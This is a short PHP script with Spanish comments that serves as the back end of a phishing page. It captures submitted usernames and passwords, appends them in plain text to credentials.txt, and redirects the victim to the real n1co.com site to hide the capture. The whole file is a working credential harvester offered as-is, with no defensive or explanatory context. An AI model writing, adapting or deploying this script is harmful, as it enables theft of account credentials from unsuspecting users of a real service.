<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Guardar en un archivo
    $data = date('Y-m-d H:i:s') . " - Usuario: " . $username . " - Contraseña: " . $password . "\n";
    file_put_contents('credentials.txt', $data, FILE_APPEND);
    
    // Redirigir a algún sitio después de capturar
    header('Location: https://www.n1co.com');
    exit;
}
?>
